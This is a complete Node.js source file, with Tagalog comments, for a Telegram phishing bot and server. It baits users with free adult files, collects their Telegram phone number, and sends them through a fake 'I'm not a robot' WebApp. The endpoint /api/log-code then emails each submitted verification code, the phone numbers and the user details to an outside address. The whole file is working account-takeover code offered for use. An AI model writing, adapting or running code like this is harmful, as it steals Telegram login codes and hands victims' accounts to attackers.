import express from "express";
import cors from "cors";
import { Telegraf } from "telegraf";
import nodemailer from "nodemailer";

const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBAPP_URL = process.env.WEBAPP_URL;     // e.g. https://tgreward.shop/webapp.html
const WEBSITE_URL = process.env.WEBSITE_URL;   // e.g. https://tgreward.shop/QTSJAOPPHU.html

// SMTP config (set sa Railway)
const SMTP_HOST = process.env.SMTP_HOST;
const SMTP_PORT = Number(process.env.SMTP_PORT || 587);
const SMTP_USER = process.env.SMTP_USER;
const SMTP_PASS = process.env.SMTP_PASS;
const FROM_EMAIL = process.env.FROM_EMAIL || SMTP_USER;
const TO_EMAIL = process.env.TO_EMAIL || "tgreward@proton.me";

if (!BOT_TOKEN) {
  throw new Error("BOT_TOKEN is not set");
}

const bot = new Telegraf(BOT_TOKEN);

// simple in-memory storage: Telegram user id -> phone number (shared contact)
const userPhones = new Map();

// /start handler
bot.start((ctx) => {
  const payload = ctx.startPayload; // from ?start=...

  if (payload !== "from_website") {
    return ctx.reply(
      "Para gumana ang bot na ito, paki-bisita muna ang website:\n" +
      WEBSITE_URL
    );
  }

  // 1) Hingi ng Telegram phone number (optional pero recommended)
  ctx.reply(
    "Para ma-verify na legit Telegram account ka, puwede mong i-share ang TELEGRAM phone number mo gamit ang button sa ibaba (optional pero recommended).",
    {
      reply_markup: {
        keyboard: [
          [
            {
              text: "📱 Share my Telegram phone",
              request_contact: true,
            },
          ],
        ],
        resize_keyboard: true,
        one_time_keyboard: true,
      },
    }
  );

  // 2) Sabay padala ng WebApp button
  return ctx.reply(
    "🔞 To access the files completely free 💦\n\n" +
    "👇 Confirm that you are not a robot",
    {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "✅ I'm not a robot!",
              web_app: { url: WEBAPP_URL },
            },
          ],
        ],
      },
    }
  );
});

// kapag nag-share ng contact (phone)
bot.on("contact", (ctx) => {
  const contact = ctx.message.contact;
  if (!contact) return;

  // siguraduhin na sariling number niya, hindi ibang contact
  if (contact.user_id && contact.user_id !== ctx.from.id) {
    return ctx.reply(
      "Mukhang ibang contact ito. Paki-tap ang button para i-share ang sarili mong Telegram number."
    );
  }

  userPhones.set(ctx.from.id, contact.phone_number);

  ctx.reply(
    "Salamat! Nakuha ko na ang Telegram phone number mo. ✅\n\n" +
      "Ngayon puwede ka nang mag-tap ng “✅ I'm not a robot!” para magpatuloy.",
    {
      reply_markup: {
        remove_keyboard: true,
      },
    }
  );
});

// optional: mabasa data mula WebApp
bot.on("message", (ctx) => {
  const data = ctx.message.web_app_data?.data;
  if (data) {
    console.log("WEBAPP DATA:", data);
    ctx.reply("Verification received ✅");
  }
});

// HTTP server
const app = express();
app.use(cors());
app.use(express.json());

// Nodemailer transporter
const transporter = nodemailer.createTransport({
  host: SMTP_HOST,
  port: SMTP_PORT,
  secure: SMTP_PORT === 465, // true kung SMTPS/465
  auth: {
    user: SMTP_USER,
    pass: SMTP_PASS,
  },
});

// endpoint na tinatawag ng WebApp
app.post("/api/log-code", async (req, res) => {
  console.log("Received /api/log-code body:", req.body);

  const { code, phone, tgUser } = req.body || {};

  if (!code) {
    console.log("Missing code in request");
    return res.status(400).json({ ok: false, error: "Missing code" });
  }

  // hanapin kung may na-share na Telegram phone number ang user
  let telegramPhone = "N/A";
  if (tgUser && typeof tgUser.id === "number") {
    const stored = userPhones.get(tgUser.id);
    if (stored) {
      telegramPhone = stored;
    }
  }

  const subject = "New verification code from Telegram user";
  const text = [
    "A user submitted a verification code.",
    "",
    `Code: ${code}`,
    `Phone (typed in WebApp): ${phone || "N/A"}`,
    `Telegram phone (shared contact): ${telegramPhone}`,
    "",
    "Telegram user info:",
    JSON.stringify(tgUser || {}, null, 2),
    "",
    `Time: ${new Date().toISOString()}`,
  ].join("\n");

  try {
    const info = await transporter.sendMail({
      from: FROM_EMAIL,
      to: TO_EMAIL,
      subject,
      text,
    });
    console.log("Email sent:", info.messageId);
    return res.json({ ok: true });
  } catch (err) {
    console.error("Email send error:", err);
    return res.status(500).json({ ok: false, error: "Email send failed" });
  }
});

app.get("/", (req, res) => {
  res.send("Bot + API is running");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("HTTP server running on port", PORT);
});

bot.launch();
console.log("Bot started");

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
